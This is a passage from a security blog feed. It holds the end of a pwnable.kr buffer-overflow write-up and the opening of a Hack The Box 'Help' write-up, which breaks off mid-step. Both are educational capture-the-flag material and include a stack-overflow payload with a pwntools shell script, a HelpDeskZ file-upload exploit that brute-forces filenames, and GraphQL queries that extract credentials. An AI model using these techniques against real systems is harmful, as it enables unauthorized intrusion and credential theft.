&lt;h4 id=&quot;now-lets-continue-the-execution-c-and-wait-for-our-break-point&quot;&gt;Now let’s continue the execution (&lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt;) and wait for our break point.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-gave-it-a-short-input-because-we-dont-need-to-crash-it-and-overwrite-stuff-on-the-stack-we-just-need-to-look-at-the-stack-during-a-normal-execution-to-locate-0xdeadbeef&quot;&gt;I gave it a short input because we don’t need to crash it and overwrite stuff on the stack, we just need to look at the stack during a normal execution to locate &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;after-hitting-the-second-break-point-lets-look-at-the-stack-&quot;&gt;After hitting the second break point let’s look at the stack :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;x/50wx $esp&lt;/code&gt;
&lt;img src=&quot;/images/pwn/bof/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;0xdeadbeef-appears-at-the-first-row-in-front-of-0xbffff2e0-and-our-input-starts-to-appear-at-the-last-row-in-front-of-0xbffff2a0-we-can-locate-the-distance-between-our-input-and-0xdeadbeef-easily-each-hex-value-represents-4-chars-0x41414141--aaaa-and-we-have-exactly-13-of-them-before-0xdeadbeef-1--4--4--4&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; appears at the first row in front of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff2e0&lt;/code&gt; and our input starts to appear at the last row in front of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff2a0&lt;/code&gt;. We can locate the distance between our input and &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; easily, each hex value represents 4 chars (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x41414141 == AAAA&lt;/code&gt;) and we have exactly 13 of them before &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;1 + 4 + 4 + 4&lt;/code&gt;).&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-to-give-the-program-exactly-52-chars-then-0xcafebabe-and-eventually-0xdeadbeef-will-be-overwritten&quot;&gt;We need to give the program exactly 52 chars then &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; and eventually &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; will be overwritten.&lt;/h4&gt;
&lt;h4 id=&quot;lets-try-it-i-used-python-to-print-the-payload-in-a-file-then-i-piped-that-file-to-the-nc-connection-&quot;&gt;Let’s try it, I used python to print the payload in a file then I piped that file to the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; connection :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 52 + '\xbe\xba\xfe\xca'&quot; &amp;gt; ./payload&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;(cat payload &amp;amp;&amp;amp; cat) | nc pwnable.kr 9000&lt;/code&gt;
&lt;img src=&quot;/images/pwn/bof/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;pwned-&quot;&gt;Pwned !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;writing-an-exploit-with-pwntools&quot;&gt;Writing an Exploit with pwntools&lt;/h3&gt;
&lt;h4 id=&quot;one-of-the-cool-things-about-pwntools-is-the-simplicity-combined-with-the-simplicity-of-this-exploit-will-make-it-just-4-lines-of-code&quot;&gt;One of the cool things about &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; is the simplicity, combined with the simplicity of this exploit will make it just 4 lines of code.&lt;/h4&gt;
&lt;h4 id=&quot;first-thing-we-need-to-do-is-to-import-pwntools--from-pwn-import-&quot;&gt;First thing we need to do is to import &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;from pwn import *&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-need-to-store-our-payload-in-a-variable--payload--a--52--xbexbaxfexca&quot;&gt;We need to store our payload in a variable : &lt;code class=&quot;highlighter-rouge&quot;&gt;payload = 'A' * 52 + '\xbe\xba\xfe\xca'&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-we-need-to-initiate-the-connection-and-assign-a-variable-for-it--shell--remotepwnablekr-9000&quot;&gt;Then we need to initiate the connection and assign a variable for it : &lt;code class=&quot;highlighter-rouge&quot;&gt;shell = remote('pwnable.kr' ,9000)&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;after-that-we-will-send-the-payload--shellsendpayload&quot;&gt;After that we will send the payload : &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.send(payload)&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;and-finally-we-can-interact-with-our-shell--shellinteractive&quot;&gt;And finally we can interact with our shell : &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.interactive()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbe\xba\xfe\xca&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pwnable.kr'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;pwned-again-&quot;&gt;Pwned again !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-other-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;other write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;h4 id=&quot;previous-pwn-write-up--pwnablekr---fd&quot;&gt;Previous pwn write-up : &lt;a href=&quot;/pwn/fd/&quot;&gt;pwnable.kr - fd&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Binary Exploitation" /><category term="Buffer Overflow" /><category term="code analysis" /><category term="Exploit Development" /><category term="c" /><category term="Python" /><summary type="html">Introduction Hey guys it’s been a long time since my first pwn write-up, today I’ll write about another challenge from pwnable.kr called bof. It was a simple easy buffer overflow challenge (You can also check these), by overwriting a variable we can get a shell. I’ll also write a small exploit with pwntools that spawns a shell automatically. Challenge Description ``` Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/pwn/bof/0.png" /></entry><entry><title type="html">Hack The Box - Help</title><link href="http://localhost:4000/hack-the-box/help/" rel="alternate" type="text/html" title="Hack The Box - Help" /><published>2019-06-08T00:00:00+02:00</published><updated>2019-06-08T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/help</id><content type="html" xml:base="http://localhost:4000/hack-the-box/help/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-help-retired-and-heres-my-write-up-about-it-help-was-a-nice-easy-machine-i-dont-really-have-much-to-say-about-it-to-get-an-initial-shell-on-the-box-we-will-exploit-a-non-authenticated-file-upload-vulnerability-in-a-web-application-called-helpdeskz-this-vulnerability-could-be-exploited-in-two-ways-either-by-editing-the-exploit-to-include-a-higher-range-or-by-getting-credentials-to-the-web-app-and-editing-some-settings-to-make-the-exploit-work-after-getting-a-shell-the-privilege-escalation-part-is-just-a-kernel-exploit-its-a-linux-box-and-its-ip-is-101010121-i-added-it-to-etchosts-as-helphtb-lets-jump-right-in-&quot;&gt;Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt;. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.121&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;help.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC help.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ssh-on-port-22-and-http-on-two-ports--80-and-3000-whats-running-on-port-80-is-an-apache2-server-and-on-port-3000-is-nodejs-express-framework&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22 and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on two ports : 80 and 3000. What’s running on port 80 is an &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache2&lt;/code&gt; server and on port 3000 is &lt;code class=&quot;highlighter-rouge&quot;&gt;Node.js Express Framework&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;on-port-80-theres-just-the-default-apache-index-page-&quot;&gt;On port 80 there’s just the default &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache&lt;/code&gt; index page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-ran-gobuster-and-got-these-results-&quot;&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://help.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/06/07 13:03:25 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
=====================================================
2019/06/07 13:05:25 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-to-support-and-there-was-a-web-application-called-helpdeskz-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/support&lt;/code&gt; and there was a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;file-upload-vulnerability&quot;&gt;File Upload Vulnerability&lt;/h3&gt;
&lt;h4 id=&quot;a-quick-search-and-i-found-an-unauthenticated-file-upload-vulnerability-that-takes-advantage-of-the-weak-file-renaming-function-thats-responsible-for-renaming-tickets-attachments-and-the-ability-to-upload-php-files-because-they-are-allowed-by-default&quot;&gt;A quick search and I found an &lt;a href=&quot;https://www.exploit-db.com/exploits/40300&quot;&gt;unauthenticated file upload vulnerability&lt;/a&gt; that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files because they are allowed by default.&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.
The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file. -&lt;a href=&quot;https://www.exploit-db.com/exploits/40300&quot;&gt;exploit-db&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;i-wanted-to-test-if-i-can-really-upload-php-so-i-went-to-submit-a-ticket-and-i-attached-a-test-file-&quot;&gt;I wanted to test if I can really upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; so I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;Submit a Ticket&lt;/code&gt; and I attached a test file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/help/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/help/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-i-got-file-is-not-allowed&quot;&gt;And I got &lt;code class=&quot;highlighter-rouge&quot;&gt;File is not allowed.&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;luckily-helpdeskz-is-an-open-source-application-so-i-checked-the-source-on-github&quot;&gt;Luckily &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt; is an open-source application so I checked the source on &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0&quot;&gt;github&lt;/a&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;the-script-that-handles-tickets-submissions-is-called-new-ticketphp-it-can-be-found-in-includesparser&quot;&gt;The script that handles tickets submissions is called &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/parser/new_ticket.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;new-ticket.php&lt;/code&gt;&lt;/a&gt;. It can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;includes/parser&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;heres-the-part-for-the-attachments-&quot;&gt;Here’s the part for the attachments :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(is_array($attachments)){
		$save_dir = UPLOAD_DIR;
		foreach($attachments as $attachment) {
		  // get the attachment name
		  $filename = $attachment-&amp;gt;filename;
		  // write the file to the directory you want to save it in
		  if ($fp = fopen($save_dir.$filename, 'w')) {
			while($bytes = $attachment-&amp;gt;read()) {
			  fwrite($fp, $bytes);
			}
			fclose($fp);
		  }
			
		  $filesize = @filesize(UPLOAD_DIR.$filename);
		  if($filesize){
			  $fileinfo = array('name' =&amp;gt; $filename, 'size' =&amp;gt; $filesize);
			  $fileverification = verifyAttachment($fileinfo);
			  if($fileverification['msg_code'] == 0){
				$ext = pathinfo($filename, PATHINFO_EXTENSION);
				$filename_encoded = md5($filename.time()).&quot;.&quot;.$ext;
				$data = array('name' =&amp;gt; $filename, 'enc' =&amp;gt; $filename_encoded, 'filesize' =&amp;gt; $filesize, 'ticket_id' =&amp;gt; $ticketid, 'msg_id' =&amp;gt; $message_id, 'filetype' =&amp;gt; $attachment-&amp;gt;content_type);
				$db-&amp;gt;insert(TABLE_PREFIX.&quot;attachments&quot;, $data);
				rename(UPLOAD_DIR.$filename, UPLOAD_DIR.'tickets/'.$filename_encoded);
			  }else{
				unlink(UPLOAD_DIR.$filename);
			  }
		  }
		}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-takes-the-file-and-uploads-it-then-theres-an-if-statement-that-checks-the-result-of-passing-fileinfo-to-a-function-called-verifyattachment-if-the-function-returned-0-it-will-rename-the-file-if-its-not-0-it-will-delete-the-file-unlinkupload_dirfilename--this-function-can-be-found-in-functionsphp-in-includes&quot;&gt;It takes the file and uploads it then there’s an &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement that checks the result of passing &lt;code class=&quot;highlighter-rouge&quot;&gt;$fileinfo&lt;/code&gt; to a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;verifyAttachment&lt;/code&gt;. If the function returned &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; it will rename the file. If it’s not &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; it will delete the file (&lt;code class=&quot;highlighter-rouge&quot;&gt;unlink(UPLOAD_DIR.$filename)&lt;/code&gt;) . This function can be found in &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/functions.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;functions.php&lt;/code&gt;&lt;/a&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;includes/&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;verifyAttachment()&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/help/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function verifyAttachment($filename){
	global $db;	
	$namepart = explode('.', $filename['name']);
	$totalparts = count($namepart)-1;
	$file_extension = $namepart[$totalparts];
	if(!ctype_alnum($file_extension)){
		$msg_code = 1;
	}else{
		$filetype = $db-&amp;gt;fetchRow(&quot;SELECT count(id) AS total, size FROM &quot;.TABLE_PREFIX.&quot;file_types WHERE type='&quot;.$db-&amp;gt;real_escape_string($file_extension).&quot;'&quot;);
		if($filetype['total'] == 0){
			$msg_code = 2;
		}elseif($filename['size'] &amp;gt; $filetype['size'] &amp;amp;&amp;amp; $filetype['size'] &amp;gt; 0){
			$msg_code = 3;
			$misc = formatBytes($filetype['size']);
		}else{	
			$msg_code = 0;
		}
	}
	$data = array('msg_code' =&amp;gt; $msg_code, 'msg_extra' =&amp;gt; $misc);
	return $data;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-function-runs-several-checks-on-the-file-but-interestingly-it-doesnt-check-for-allowed-file-extensions-this-means-that-if-the-file-passed-these-checks-the-function-will-return-0-and-the-file-will-be-renamed-and-successfully-uploaded-no-matter-whats-the-extension-of-that-file-and-the-message-that-says--file-is-not-allowed-is-meaningless&quot;&gt;This function runs several checks on the file, but interestingly it doesn’t check for allowed file extensions. This means that if the file passed these checks the function will return &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and the file will be renamed and successfully uploaded no matter what’s the extension of that file and the message that says : &lt;code class=&quot;highlighter-rouge&quot;&gt;File is not allowed.&lt;/code&gt; is meaningless.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-take-a-look-at-how-the-application-renames-files-it-gets-the-md5-hash-of-the-filename-concatenated-with-the-time-of-upload-then-it-concatenates-that-hash-with-the-original-file-extension-and-thats-how-the-exploit-finds-the-uploaded-file-but-theres-a-small-problem-about-time-running-the-exploit-on-our-box-would-use-our-local-time-if-the-timezone-of-the-web-app-is-different-from-the-timezone-of-our-box-the-exploit-will-fail-to-find-the-file-because-it-will-use-a-wrong-time&quot;&gt;If we take a look at how the application renames files it gets the md5 hash of the filename concatenated with the time of upload then it concatenates that hash with the original file extension. And that’s how the exploit finds the uploaded file. But there’s a small problem about time, running the exploit on our box would use our local time. If the timezone of the web app is different from the timezone of our box the exploit will fail to find the file because it will use a wrong time.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-take-a-look-at-the-exploit-&quot;&gt;If we take a look at the exploit :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) &amp;lt; 3:
    print &quot;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print &quot;found!&quot;
        print url
        sys.exit(0)

print &quot;Sorry, I did not find anything&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-solve-this-problem-by-iterating-over-a-higher-range-than-300--for-x-in-range0-300&quot;&gt;We can solve this problem by iterating over a higher range than 300 : &lt;code class=&quot;highlighter-rouge&quot;&gt;for x in range(0, 300)&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;this-will-make-it-try-different-hashes-according-to-different-times-until-it-finds-the-file-you-can-call-it-a-bruteforce-attack-that-will-be-easy-lets-look-at-another-solution-another-solution-is-to-get-credentials-to-login-to-the-web-app-and-edit-the-timezone-in-the-settings-to-make-it-the-same-as-ours&quot;&gt;This will make it try different hashes according to different times until it finds the file, you can call it a bruteforce attack. That will be easy let’s look at another solution. Another solution is to get credentials to login to the web app and edit the timezone in the settings to make it the same as ours.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nodejs-getting-credentials&quot;&gt;Node.js, Getting Credentials&lt;/h3&gt;
&lt;h4 id=&quot;we-saw-earlier-that-port-3000-was-open-and-running-nodejs-express-framework-and-we-havent-looked-at-that-yet&quot;&gt;We saw earlier that port 3000 was open and running &lt;code class=&quot;highlighter-rouge&quot;&gt;Node.js Express framework&lt;/code&gt; and we haven’t looked at that yet.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-going-to-httphelphtb3000-i-got-this-response-of-a-message-saying--hi-shiv-to-get-access-please-find-the-credentials-with-given-query-i-tried-test-and-got-this-&quot;&gt;By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/&lt;/code&gt; I got this response of a message saying : &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Hi Shiv, To get access please find the credentials with given query&quot;&lt;/code&gt;, I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/test&lt;/code&gt; and got this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;tbh-the-next-step-involved-a-lot-of-guessingfuzzing-with-custom-wordlists-and-random-things-based-on-google-searches-about-nodejs-nodejs-queries-and-other-related-stuff-after-a-lot-of-attempts-to-find-something-when-i-tried-graphql-i-got-this-response-&quot;&gt;tbh the next step involved a lot of guessing/fuzzing with custom wordlists and random things based on google searches about &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt; queries and other related stuff. After a lot of attempts to find something when I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/graphql&lt;/code&gt; I got this response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-added-query--httphelphtb3000graphqlquery-and-got-a-syntax-error-&quot;&gt;So I added &lt;code class=&quot;highlighter-rouge&quot;&gt;?query&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query&lt;/code&gt; and got a syntax error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-fine-i-tried-requesting-a-query-for-example-user--httphelphtb3000graphqlqueryuser-&quot;&gt;That’s fine, I tried requesting a query, for example &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user}&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-says-that-user-must-have-a-selection-of-subfields-so-i-tried-username--httphelphtb3000graphqlqueryuserusername-&quot;&gt;It says that &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; must have a selection of subfields so I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user{username}}&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-lets-get-the-password--httphelphtb3000graphqlqueryuserpassword-&quot;&gt;Great, let’s get the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user{password}}&lt;/code&gt; :&lt;/h4&gt;
